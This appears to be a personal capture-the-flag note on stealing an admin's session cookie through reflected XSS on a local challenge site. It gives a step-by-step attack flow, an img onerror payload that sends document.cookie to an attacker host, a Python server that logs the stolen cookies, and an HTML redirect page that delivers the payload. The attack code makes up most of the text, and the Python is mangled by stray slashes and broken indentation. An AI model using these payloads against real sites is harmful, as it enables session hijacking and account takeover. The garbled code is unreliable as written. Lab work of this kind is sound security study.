1. Victim (admin) visits hacker.localhost
                    │
2. Page redirects to:
   /path?key=<img src=x onerror=fetch('http://hacker.localhost:1337/steal?c='%2Bdocument.cookie)>
                    │
3. The /path page renders the payload
                    │
4. Image fails to load → onerror fires
                    │
5. fetch() sends document.cookie to your server
                    │
6. Your server logs: auth=admin|{flag[-20:]}
                    │
7. You use this cookie to access challenge.localhost
                    │
8. Flag is displayed!



testbook example of cookie stealing through csrf xss attack 




______server to catch the cookies_______
/#!/usr/bin/env python3
/from http.server import HTTPServer, BaseHTTPRequestHandler

/class LoggingHandler(BaseHTTPRequestHandler):
/   def log_message(self, format, *args):
/        # Print everything
/        print(f"[LOG] {format % args}")
    
/    def do_GET(self):
/        print(f"[!] Path: {self.path}")
/        print(f"[!] Headers: {self.headers}")
/        print(f"[!] Client: {self.client_address}\n")
/        
/     if 'auth' in self.path or 'cookie' in self.path:
/            print(f"[+] DATA: {self.path}\n")
/        
/        self.send_response(200)
/        self.send_header('Content-Type', 'text/html')
/        self.end_headers()
/        
/        if self.path == '/' or self.path == '/index.html':
/            try:
                with open('index.html', 'rb') as f:
/                    self.wfile.write(f.read())
/         except:
/                self.wfile.write(b'<html><body>index.html not found</body></html>')
/        else:
/            self.wfile.write(b'<html><body>OK - Cookie received!</body></html>')

/server = HTTPServer(('0.0.0.0', 1337), LoggingHandler)
/server.serve_forever()


_________________payload____________
/<!DOCTYPE html>
/<html>
/<body>
/   <script>
/        var payload = "<img src=x onerror='new Image().src=\"http://hacker.localhost:1337/\" + document.cookie'>";
/        window.location.href = "http://challenge.localhost/ephemeral?msg=" + encodeURIComponent(payload);
/    </script>
/</body>
/</html>






